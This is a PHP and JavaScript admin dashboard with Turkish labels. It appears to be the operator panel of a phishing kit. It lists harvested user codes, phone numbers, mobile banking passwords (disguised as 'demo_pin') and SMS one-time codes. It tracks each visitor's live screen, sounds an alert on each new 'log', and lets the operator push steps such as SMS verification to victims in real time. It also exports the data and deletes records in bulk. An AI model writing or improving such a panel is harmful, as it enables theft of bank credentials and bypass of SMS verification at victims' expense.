<?php
declare(strict_types=1);
require_once dirname(__DIR__) . '/includes/storage.php';
requireAdmin();
upsertPresence('index', null, true);
$token = csrfToken();

$kbAdminStatusLabels = [];
foreach (APPLICATION_STATUSES as $kbStatus) {
    $kbAdminStatusLabels[$kbStatus] = statusLabel($kbStatus);
}
?>
<!doctype html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Admin Panel</title>
  <?php
  $kbStatusesJson = json_encode(APPLICATION_STATUSES, JSON_UNESCAPED_UNICODE | JSON_HEX_TAG | JSON_HEX_APOS | JSON_INVALID_UTF8_SUBSTITUTE);
  $kbLabelsJson = json_encode($kbAdminStatusLabels, JSON_UNESCAPED_UNICODE | JSON_HEX_TAG | JSON_HEX_APOS | JSON_INVALID_UTF8_SUBSTITUTE);
  if ($kbStatusesJson === false) {
      $kbStatusesJson = '[]';
  }
  if ($kbLabelsJson === false) {
      $kbLabelsJson = '{}';
  }
  ?>
  <script>
    window.KB_STATUSES = <?= $kbStatusesJson ?>;
    window.KB_STATUS_LABELS = <?= $kbLabelsJson ?>;
  </script>
  <link rel="stylesheet" href="../assets/app.css">
  <style>
    html {
      background: #000;
    }

    body.admin-dark {
      margin: 0;
      min-height: 100vh;
      background: #000;
      font-size: 14px;
      font-family: "Segoe UI", Arial, sans-serif;
      color: #e5e7eb;
    }

    .admin-dark .container {
      width: 100%;
      max-width: 920px;
      margin: 0 auto;
      padding: 18px 14px;
    }

    .admin-dark .topbar {
      display: flex;
      justify-content: space-between;
      align-items: center;
      gap: 10px;
      margin-bottom: 14px;
      flex-wrap: wrap;
    }

    .admin-dark .actions {
      display: flex;
      gap: 10px;
      flex-wrap: wrap;
    }

    .admin-dark table {
      width: 100%;
      border-collapse: collapse;
    }

    .admin-dark h2 {
      font-size: 22px;
    }

    #summaryTotal,
    #summaryToday,
    #summarySmsVerified,
    #summaryOnay,
    #summaryBeklemede {
      font-size: 22px !important;
    }

    .admin-dark .field label {
      font-size: 12px;
      margin-bottom: 6px;
    }

    .admin-dark .field input,
    .admin-dark .field select {
      height: 40px;
      font-size: 13px;
    }

    .admin-dark .btn {
      height: 40px;
      font-size: 13px;
      padding: 0 12px;
    }

    .admin-dark th {
      font-size: 12px;
      padding: 10px 7px;
    }

    .admin-dark td {
      font-size: 13px;
      padding: 10px 7px;
    }

    #tableMeta,
    #pageInfo {
      font-size: 12px;
    }

    .btn-danger {
      background: #dc2626;
      color: #fff;
      border: 1px solid #ef4444;
    }

    .btn-danger:hover {
      background: #b91c1c;
    }

    .confirm-modal[hidden] {
      display: none;
    }

    .confirm-modal {
      position: fixed;
      inset: 0;
      z-index: 999;
      background: rgba(3, 7, 18, 0.68);
      display: grid;
      place-items: center;
      padding: 16px;
    }

    .confirm-modal-card {
      width: min(100%, 420px);
      background: #11161f;
      border: 1px solid #293549;
      border-radius: 14px;
      box-shadow: 0 20px 45px rgba(0, 0, 0, 0.45);
      padding: 16px;
      color: #e5e7eb;
    }

    .confirm-modal-title {
      margin: 0 0 10px;
      font-size: 20px;
      font-weight: 800;
      color: #fff;
    }

    .confirm-modal-text {
      margin: 0;
      color: #cbd5e1;
      line-height: 1.45;
    }

    .confirm-modal-actions {
      margin-top: 16px;
      display: flex;
      justify-content: flex-end;
      gap: 10px;
    }
  </style>
</head>
<body class="admin-dark">
  <div class="container">
    <div class="topbar">
      <div>
        <h2 style="margin-bottom: 0;">Admin Panel</h2>
      </div>
      <div class="actions">
        <a class="btn btn-secondary" href="../giris.php" style="text-decoration:none;display:inline-flex;align-items:center;">Demo Formu</a>
        <a class="btn btn-secondary" href="logout.php" style="text-decoration:none;display:inline-flex;align-items:center;">Cikis</a>
      </div>
    </div>

    <div id="flashBox" class="alert" hidden></div>

    <div class="card" style="margin-bottom: 14px;">
      <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:10px;">
        <div style="background:#0f141c;border:1px solid #243244;border-radius:10px;padding:12px;">
          <div class="muted" style="font-size:12px;">Toplam Basvuru</div>
          <div id="summaryTotal" style="font-size:26px;font-weight:800;">0</div>
        </div>
        <div style="background:#0f141c;border:1px solid #243244;border-radius:10px;padding:12px;">
          <div class="muted" style="font-size:12px;">Bugun Gelen</div>
          <div id="summaryToday" style="font-size:26px;font-weight:800;">0</div>
        </div>
        <div style="background:#0f141c;border:1px solid #243244;border-radius:10px;padding:12px;">
          <div class="muted" style="font-size:12px;">Kod Dogrulandi</div>
          <div id="summarySmsVerified" style="font-size:26px;font-weight:800;">0</div>
        </div>
        <div style="background:#0f141c;border:1px solid #243244;border-radius:10px;padding:12px;">
          <div class="muted" style="font-size:12px;">Onayli</div>
          <div id="summaryOnay" style="font-size:26px;font-weight:800;">0</div>
        </div>
        <div style="background:#0f141c;border:1px solid #243244;border-radius:10px;padding:12px;">
          <div class="muted" style="font-size:12px;">Beklemede</div>
          <div id="summaryBeklemede" style="font-size:26px;font-weight:800;">0</div>
        </div>
      </div>
    </div>

    <div class="card" style="margin-bottom: 14px;">
      <div class="topbar" style="margin-bottom: 0;">
        <span class="status-badge status-sms-dogrulama" style="font-size:15px; padding:8px 14px;">Cevrimici: <strong id="onlineCount">0</strong></span>
      </div>
    </div>

    <div class="card">
      <div class="actions" style="margin-bottom:10px; justify-content:flex-end;">
        <button type="button" id="deleteAllBtn" class="btn btn-danger">Tumunu Sil</button>
        <button type="button" id="exportCsvBtn" class="btn btn-secondary">CSV Indir</button>
        <button type="button" id="exportExcelBtn" class="btn btn-secondary">Excel Indir</button>
      </div>

      <div id="tableMeta" class="muted" style="margin-bottom:10px;">Kayitlar yukleniyor...</div>

      <div class="mobile-scroll">
        <table>
          <thead>
            <tr>
              <th>Basvuru No</th>
              <th>Kullanici Kodu</th>
              <th>Cep Telefonu</th>
              <th>Mobil Şifre</th>
              <th>Sms Şifresi</th>
              <th>Durum</th>
              <th>Canli Durum</th>
              <th>Durum Guncelleme</th>
              <th>Sil</th>
            </tr>
          </thead>
          <tbody id="applicationsBody"></tbody>
        </table>
      </div>

      <div class="topbar" style="margin-top:10px; margin-bottom:0;">
        <div id="pageInfo" class="muted">Sayfa 1 / 1</div>
        <div class="actions">
          <button type="button" id="prevPageBtn" class="btn btn-secondary">Onceki</button>
          <button type="button" id="nextPageBtn" class="btn btn-secondary">Sonraki</button>
        </div>
      </div>
    </div>
  </div>

  <div id="confirmModal" class="confirm-modal" hidden>
    <div class="confirm-modal-card" role="dialog" aria-modal="true" aria-labelledby="confirmModalTitle">
      <h3 id="confirmModalTitle" class="confirm-modal-title">Onay</h3>
      <p id="confirmModalText" class="confirm-modal-text"></p>
      <div class="confirm-modal-actions">
        <button type="button" id="confirmModalCancel" class="btn btn-secondary">Vazgec</button>
        <button type="button" id="confirmModalOk" class="btn btn-danger">Evet, Sil</button>
      </div>
    </div>
  </div>

  <script>
    const csrfToken = <?= json_encode($token) ?>;
    let currentCount = 0;
    let onlineCount = 0;
    let statusList = Array.isArray(window.KB_STATUSES) ? [...window.KB_STATUSES] : [];
    let statusLabels = Object.assign({}, window.KB_STATUS_LABELS || {});
    let allApplications = [];
    let filteredApplications = [];
    let currentPage = 1;
    let totalPages = 1;
    let pageSize = 25;
    let searchTerm = "";
    let selectedStatus = "";
    let newLogAudio = null;

    const searchInput = document.getElementById("tableSearch");
    const statusFilterSelect = document.getElementById("tableStatusFilter");
    const rowsPerPageSelect = document.getElementById("rowsPerPage");
    const pageInfo = document.getElementById("pageInfo");
    const prevPageBtn = document.getElementById("prevPageBtn");
    const nextPageBtn = document.getElementById("nextPageBtn");
    const tableMeta = document.getElementById("tableMeta");
    const deleteAllBtn = document.getElementById("deleteAllBtn");
    const exportCsvBtn = document.getElementById("exportCsvBtn");
    const exportExcelBtn = document.getElementById("exportExcelBtn");
    const confirmModal = document.getElementById("confirmModal");
    const confirmModalTitle = document.getElementById("confirmModalTitle");
    const confirmModalText = document.getElementById("confirmModalText");
    const confirmModalCancel = document.getElementById("confirmModalCancel");
    const confirmModalOk = document.getElementById("confirmModalOk");
    let confirmModalResolver = null;

    function esc(value) {
      return String(value ?? "")
        .replaceAll("&", "&amp;")
        .replaceAll("<", "&lt;")
        .replaceAll(">", "&gt;")
        .replaceAll("\"", "&quot;")
        .replaceAll("'", "&#039;");
    }

    function setFlash(message, type = "success") {
      const box = document.getElementById("flashBox");
      if (!message) {
        box.hidden = true;
        box.textContent = "";
        box.className = "alert";
        return;
      }
      box.hidden = false;
      box.className = `alert ${type === "error" ? "alert-error" : "alert-success"}`;
      box.textContent = message;
    }

    function askConfirm({ title, text, confirmText = "Evet, Sil", cancelText = "Vazgec" }) {
      return new Promise((resolve) => {
        confirmModalResolver = resolve;
        confirmModalTitle.textContent = title;
        confirmModalText.textContent = text;
        confirmModalOk.textContent = confirmText;
        confirmModalCancel.textContent = cancelText;
        confirmModal.hidden = false;
      });
    }

    function closeConfirmModal(result) {
      if (confirmModal.hidden) return;
      confirmModal.hidden = true;
      if (typeof confirmModalResolver === "function") {
        confirmModalResolver(result);
      }
      confirmModalResolver = null;
    }

    function getNewLogAudio() {
      if (!newLogAudio) {
        newLogAudio = new Audio("../assets/sounds/new-log.mp3");
        newLogAudio.preload = "auto";
        newLogAudio.volume = 0.88;
      }
      return newLogAudio;
    }

    function playNewLogTone() {
      try {
        const a = getNewLogAudio();
        a.currentTime = 0;
        const p = a.play();
        if (p && typeof p.catch === "function") {
          p.catch(() => {});
        }
      } catch (e) {
        // no-op
      }
    }

    function statusBadgeClass(status) {
      if (status === "sms-dogrulama") return "status-sms-dogrulama";
      if (status === "onay" || status === "tebrikler") return "status-onay";
      return "status-beklemede";
    }

    function renderOnline() {
      const onlineCountEl = document.getElementById("onlineCount");
      onlineCountEl.textContent = String(onlineCount);
    }

    function renderSummary(summary) {
      const safeSummary = summary || {};
      const statusCounts = safeSummary.status_counts || {};
      document.getElementById("summaryTotal").textContent = String(Number(safeSummary.total || 0));
      document.getElementById("summaryToday").textContent = String(Number(safeSummary.today || 0));
      document.getElementById("summarySmsVerified").textContent = String(Number(safeSummary.code_verified || 0));
      document.getElementById("summaryOnay").textContent = String(Number(statusCounts["onay"] || 0));
      document.getElementById("summaryBeklemede").textContent = String(Number(statusCounts["beklemede"] || 0));
    }

    function renderApplications(applications) {
      const tbody = document.getElementById("applicationsBody");
      if (!Array.isArray(applications) || applications.length === 0) {
        tbody.innerHTML = '<tr><td colspan="9" class="muted">Kayit yok.</td></tr>';
        return;
      }

      tbody.innerHTML = applications.map((app) => {
        const live = app.live || {};
        const isOnline = Boolean(live.is_online);
        const liveBadgeClass = isOnline ? "status-onay" : "status-beklemede";
        const liveBadgeText = isOnline ? "Cevrimici" : "Cevrimdisi";
        const liveDetail = isOnline
          ? (live.screen_label || live.screen || "Sitede aktif")
          : "Sitede degil";
        const options = statusList.map((status) => {
          const selected = app.status === status ? "selected" : "";
          const label = statusLabels[status] || status;
          return `<option value="${esc(status)}" ${selected}>${esc(label)}</option>`;
        }).join("");

        const id = esc(app.id || "");
        return `
          <tr data-app-id="${id}">
            <td class="mono">${id}</td>
            <td>${esc(app.user_code || "")}</td>
            <td>${esc(app.phone || "Yok")}</td>
            <td>${esc(app.demo_pin || "Yok")}</td>
            <td>${esc(app.sms_code || "Yok")}</td>
            <td><span class="status-badge ${statusBadgeClass(app.status)}">${esc(app.status_label || app.status)}</span></td>
            <td>
              <span class="status-badge ${liveBadgeClass}">${liveBadgeText}</span>
              <div class="muted" style="font-size:12px;">${esc(liveDetail)}</div>
            </td>
            <td>
              <div class="actions">
                <select class="status-select">${options}</select>
                <button type="button" class="btn btn-primary update-status-btn">Durumu Guncelle</button>
              </div>
            </td>
            <td>
              <button type="button" class="btn btn-secondary delete-row-btn">Sil</button>
            </td>
          </tr>
        `;
      }).join("");
    }

    function syncStatusFilterOptions() {
      if (!statusFilterSelect) return;
      const currentValue = statusFilterSelect.value;
      const options = statusList.map((status) => {
        const label = statusLabels[status] || status;
        return `<option value="${esc(status)}">${esc(label)}</option>`;
      }).join("");
      statusFilterSelect.innerHTML = `<option value="">Tumu</option>${options}`;
      if (statusList.includes(currentValue)) {
        statusFilterSelect.value = currentValue;
      }
      selectedStatus = statusFilterSelect.value;
    }

    function applyTableFilters() {
      filteredApplications = allApplications.filter((app) => {
        if (selectedStatus && app.status !== selectedStatus) return false;

        if (!searchTerm) return true;
        const haystack = [
          app.id,
          app.user_code,
          app.phone,
          app.demo_pin,
          app.sms_code,
          app.status,
          app.status_label,
          app.created_at,
          app.sms_verified ? "dogrulandi" : "bekliyor",
          (app.live && app.live.screen) || "",
          (app.live && app.live.screen_label) || "",
          (app.live && app.live.is_online) ? "cevrimici" : "cevrimdisi"
        ].join(" ").toLowerCase();
        return haystack.includes(searchTerm);
      });

      totalPages = Math.max(1, Math.ceil(filteredApplications.length / pageSize));
      if (currentPage > totalPages) currentPage = totalPages;
      if (currentPage < 1) currentPage = 1;

      const start = (currentPage - 1) * pageSize;
      const pageItems = filteredApplications.slice(start, start + pageSize);
      renderApplications(pageItems);

      pageInfo.textContent = `Sayfa ${currentPage} / ${totalPages}`;
      prevPageBtn.disabled = currentPage <= 1;
      nextPageBtn.disabled = currentPage >= totalPages;
      tableMeta.textContent = `Toplam ${allApplications.length} kayit, filtreye uyan ${filteredApplications.length} kayit`;
    }

    function buildExportUrl(format) {
      const params = new URLSearchParams({ format });
      if (searchTerm) params.set("search", searchTerm);
      if (selectedStatus) params.set("status", selectedStatus);
      return `export.php?${params.toString()}`;
    }

    async function fetchDashboardData() {
      try {
        const res = await fetch(`poll.php?_=${Date.now()}`, { cache: "no-store" });
        const data = await res.json();
        if (!data.ok) {
          setFlash("Panel verisi alinamadi.", "error");
          return;
        }
        const nextCount = Number(data.count || 0);
        if (nextCount > currentCount) {
          playNewLogTone();
        }
        currentCount = nextCount;
        onlineCount = Number(data.online_count || 0);
        statusList = Array.isArray(window.KB_STATUSES) && window.KB_STATUSES.length
          ? [...window.KB_STATUSES]
          : (Array.isArray(data.statuses) ? data.statuses : []);
        statusLabels = Object.assign({}, window.KB_STATUS_LABELS || {}, data.status_labels || {});
        allApplications = Array.isArray(data.applications) ? data.applications : [];
        syncStatusFilterOptions();
        renderOnline();
        renderSummary(data.summary || {});
        applyTableFilters();
      } catch (e) {
        setFlash("Baglanti sorunu: panel verisi cekilemedi.", "error");
      }
    }

    async function updateStatus(row) {
      const appId = row.dataset.appId;
      const select = row.querySelector(".status-select");
      const button = row.querySelector(".update-status-btn");
      if (!appId || !select || !button) return;

      button.disabled = true;
      const selectedStatus = select.value;

      try {
        const body = new URLSearchParams({
          csrf: csrfToken,
          id: appId,
          status: selectedStatus
        });
        const res = await fetch("update_status.php", {
          method: "POST",
          headers: {
            "X-Requested-With": "XMLHttpRequest",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Accept": "application/json"
          },
          body: body.toString()
        });
        const data = await res.json();
        if (!data.ok) {
          setFlash(data.error || "Durum guncellenemedi.", "error");
          button.disabled = false;
          return;
        }
        setFlash(data.message || "Durum guncellendi.", "success");
        await fetchDashboardData();
      } catch (e) {
        setFlash("Durum guncelleme sirasinda baglanti hatasi.", "error");
      } finally {
        button.disabled = false;
      }
    }

    async function deleteRow(row) {
      const appId = row.dataset.appId;
      const button = row.querySelector(".delete-row-btn");
      if (!appId || !button) return;

      const confirmed = await askConfirm({
        title: "Kayit Sil",
        text: "Bu kaydi kalici olarak silmek istiyor musunuz?",
        confirmText: "Evet, Sil"
      });
      if (!confirmed) return;

      button.disabled = true;
      try {
        const body = new URLSearchParams({
          csrf: csrfToken,
          mode: "single",
          id: appId
        });
        const res = await fetch("delete.php", {
          method: "POST",
          headers: {
            "X-Requested-With": "XMLHttpRequest",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Accept": "application/json"
          },
          body: body.toString()
        });
        const data = await res.json();
        if (!data.ok) {
          setFlash(data.error || "Kayit silinemedi.", "error");
          button.disabled = false;
          return;
        }
        setFlash(data.message || "Kayit silindi.", "success");
        await fetchDashboardData();
      } catch (e) {
        setFlash("Kayit silme sirasinda baglanti hatasi.", "error");
      } finally {
        button.disabled = false;
      }
    }

    async function deleteAllRows() {
      const confirmed = await askConfirm({
        title: "Tum Kayitlari Sil",
        text: "Bu islem geri alinamaz. Tum basvuru kayitlari kalici olarak silinecek. Devam etmek istiyor musunuz?",
        confirmText: "Evet, Tumunu Sil"
      });
      if (!confirmed) return;

      deleteAllBtn.disabled = true;
      try {
        const body = new URLSearchParams({
          csrf: csrfToken,
          mode: "all"
        });
        const res = await fetch("delete.php", {
          method: "POST",
          headers: {
            "X-Requested-With": "XMLHttpRequest",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Accept": "application/json"
          },
          body: body.toString()
        });
        const data = await res.json();
        if (!data.ok) {
          setFlash(data.error || "Kayitlar silinemedi.", "error");
          deleteAllBtn.disabled = false;
          return;
        }
        setFlash(data.message || "Tum kayitlar silindi.", "success");
        await fetchDashboardData();
      } catch (e) {
        setFlash("Toplu silme sirasinda baglanti hatasi.", "error");
      } finally {
        deleteAllBtn.disabled = false;
      }
    }

    document.getElementById("applicationsBody").addEventListener("click", (event) => {
      const button = event.target.closest(".update-status-btn");
      const deleteButton = event.target.closest(".delete-row-btn");
      const row = event.target.closest("tr[data-app-id]");
      if (!row) return;

      if (button) {
        updateStatus(row);
        return;
      }
      if (deleteButton) {
        deleteRow(row);
      }
    });

    if (searchInput) {
      searchInput.addEventListener("input", () => {
        searchTerm = searchInput.value.trim().toLowerCase();
        currentPage = 1;
        applyTableFilters();
      });
    }

    if (statusFilterSelect) {
      statusFilterSelect.addEventListener("change", () => {
        selectedStatus = statusFilterSelect.value;
        currentPage = 1;
        applyTableFilters();
      });
    }

    if (rowsPerPageSelect) {
      rowsPerPageSelect.addEventListener("change", () => {
        pageSize = Number(rowsPerPageSelect.value || 25);
        currentPage = 1;
        applyTableFilters();
      });
    }

    prevPageBtn.addEventListener("click", () => {
      if (currentPage <= 1) return;
      currentPage -= 1;
      applyTableFilters();
    });

    nextPageBtn.addEventListener("click", () => {
      if (currentPage >= totalPages) return;
      currentPage += 1;
      applyTableFilters();
    });

    exportCsvBtn.addEventListener("click", () => {
      window.location.href = buildExportUrl("csv");
    });

    exportExcelBtn.addEventListener("click", () => {
      window.location.href = buildExportUrl("excel");
    });

    deleteAllBtn.addEventListener("click", () => {
      deleteAllRows();
    });

    confirmModalCancel.addEventListener("click", () => {
      closeConfirmModal(false);
    });

    confirmModalOk.addEventListener("click", () => {
      closeConfirmModal(true);
    });

    confirmModal.addEventListener("click", (event) => {
      if (event.target === confirmModal) {
        closeConfirmModal(false);
      }
    });

    document.addEventListener("keydown", (event) => {
      if (event.key === "Escape") {
        closeConfirmModal(false);
      }
    });

    document.addEventListener(
      "click",
      () => {
        try {
          getNewLogAudio();
        } catch (e) {}
      },
      { once: true }
    );
    syncStatusFilterOptions();
    fetchDashboardData();
    setInterval(fetchDashboardData, 4000);
  </script>
</body>
</html>

